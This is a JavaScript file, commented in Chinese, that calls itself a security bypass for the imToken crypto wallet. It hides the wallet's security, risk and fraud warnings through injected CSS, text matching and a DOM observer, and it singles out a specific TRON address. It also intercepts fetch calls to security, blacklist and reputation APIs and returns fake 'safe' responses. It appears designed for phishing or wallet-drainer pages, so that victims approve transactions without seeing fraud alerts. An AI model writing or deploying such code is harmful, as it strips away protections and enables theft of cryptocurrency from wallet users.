/**
 * 优化版imToken安全绕过系统
 * 🎯 目标：在不影响页面正常运行的前提下，绕过imToken安全检测
 */

(function() {
    'use strict';
    
    console.log('🛡️ 优化版安全绕过系统已加载');
    
    // 🎯 方案1：安全的CSS隐藏（移动端兼容）
    function injectSecurityBypassCSS() {
        const style = document.createElement('style');
        style.id = 'security-bypass-styles';
        style.textContent = `
            /* 🛡️ 隐藏安全相关的类和ID */
            [class*="security-center"],
            [class*="risk-warning"], 
            [class*="fraud-warning"],
            [class*="security-alert"],
            [class*="risk-assessment"],
            [class*="authorization-risk"],
            [class*="warning-modal"],
            [class*="alert-modal"],
            [id*="security"],
            [id*="risk"],
            [id*="warning"],
            [id*="alert"] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                position: absolute !important;
                left: -9999px !important;
                top: -9999px !important;
                width: 0 !important;
                height: 0 !important;
                overflow: hidden !important;
                z-index: -9999 !important;
                pointer-events: none !important;
            }
            
            /* 🛡️ 隐藏可能的模态框覆盖层 */
            .modal-backdrop,
            .popup-overlay,
            .dialog-mask {
                display: none !important;
            }
        `;
        
        try {
            document.head.appendChild(style);
            console.log('🛡️ 安全绕过CSS已注入');
        } catch (e) {
            console.log('🛡️ CSS注入失败:', e);
        }
    }
    
    // 🎯 方案2：智能文本检测和隐藏
    function hideSecurityElements() {
        const riskKeywords = [
            '安全中心', '风险评估', '授权风险', '欺诈行为',
            '个人地址', '可能存在欺诈', '检测到风险',
            'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x'
        ];
        
        try {
            const allElements = document.querySelectorAll('*');
            let hiddenCount = 0;
            
            allElements.forEach(el => {
                if (el.textContent && el.textContent.length < 500) { // 避免处理大型元素
                    const text = el.textContent.toLowerCase();
                    const hasRiskKeyword = riskKeywords.some(keyword => 
                        text.includes(keyword.toLowerCase())
                    );
                    
                    if (hasRiskKeyword) {
                        // 不直接删除，而是隐藏
                        el.style.cssText = `
                            display: none !important;
                            visibility: hidden !important;
                            opacity: 0 !important;
                            position: absolute !important;
                            left: -9999px !important;
                        `;
                        hiddenCount++;
                    }
                }
            });
            
            if (hiddenCount > 0) {
                console.log(`🛡️ 隐藏了 ${hiddenCount} 个安全警告元素`);
            }
        } catch (e) {
            console.log('🛡️ 文本检测失败:', e);
        }
    }
    
    // 🎯 方案3：安全的API拦截
    function interceptSecurityAPIs() {
        // 拦截fetch请求
        if (window.fetch && !window.fetch._bypassed) {
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                const url = String(args[0] || '');
                
                // 检查是否是安全检查相关的API
                if (url.includes('/security/') || 
                    url.includes('/risk/') || 
                    url.includes('/fraud/') ||
                    url.includes('blacklist') ||
                    url.includes('reputation')) {
                    
                    console.log('🛡️ 拦截安全检查API:', url);
                    
                    // 返回安全的响应
                    return Promise.resolve(new Response(JSON.stringify({
                        safe: true,
                        risk_level: 0,
                        reputation: 'good',
                        warnings: [],
                        score: 100
                    }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    }));
                }
                
                return originalFetch.apply(this, args);
            };
            window.fetch._bypassed = true;
            console.log('🛡️ API拦截已启用');
        }
    }
    
    // 🎯 方案4：轻量级DOM监控
    function setupLightweightObserver() {
        if (!window.MutationObserver) return;
        
        try {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.textContent) {
                            const text = node.textContent.toLowerCase();
                            
                            // 只检查明显的安全提醒
                            if ((text.includes('安全中心') && text.includes('风险')) ||
                                (text.includes('欺诈') && text.includes('地址')) ||
                                text.includes('thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x')) {
                                
                                console.log('🛡️ 检测到新的安全警告，隐藏:', text.substring(0, 50));
                                node.style.display = 'none';
                            }
                        }
                    });
                });
            });
            
            // 观察整个文档，但限制范围
            observer.observe(document.documentElement, {
                childList: true,
                subtree: true
            });
            
            console.log('🛡️ 轻量级DOM监控已启用');
        } catch (e) {
            console.log('🛡️ DOM监控启动失败:', e);
        }
    }
    
    // 🎯 方案5：智能按钮处理
    function enhanceConfirmButtons() {
        const buttonTexts = ['确认', '确定', '同意', '继续', 'confirm', 'ok', 'continue'];
        
        try {
            buttonTexts.forEach(text => {
                const buttons = Array.from(document.querySelectorAll('button')).filter(btn => 
                    btn.textContent && btn.textContent.toLowerCase().includes(text)
                );
                
                buttons.forEach(btn => {
                    if (!btn._enhanced) {
                        btn._enhanced = true;
                        
                        // 添加点击前检查
                        btn.addEventListener('click', function(e) {
                            // 在按钮点击时快速隐藏可能的安全警告
                            setTimeout(() => {
                                hideSecurityElements();
                            }, 50);
                        }, true);
                    }
                });
            });
        } catch (e) {
            console.log('🛡️ 按钮增强失败:', e);
        }
    }
    
    // 🎯 核心初始化函数
    function initialize() {
        console.log('🛡️ 开始初始化优化版安全绕过系统...');
        
        // 立即执行的操作
        injectSecurityBypassCSS();
        interceptSecurityAPIs();
        
        // DOM准备后执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                hideSecurityElements();
                setupLightweightObserver();
                enhanceConfirmButtons();
            });
        } else {
            hideSecurityElements();
            setupLightweightObserver();
            enhanceConfirmButtons();
        }
        
        // 定期轻量级检查
        setInterval(() => {
            hideSecurityElements();
            enhanceConfirmButtons();
        }, 2000); // 每2秒检查一次
        
        console.log('🛡️ 优化版安全绕过系统初始化完成');
    }
    
    // 🎯 全局API
    window.SecurityBypass = {
        hideElements: hideSecurityElements,
        injectCSS: injectSecurityBypassCSS,
        enhanceButtons: enhanceConfirmButtons
    };
    
    // 自动初始化
    initialize();
    
})();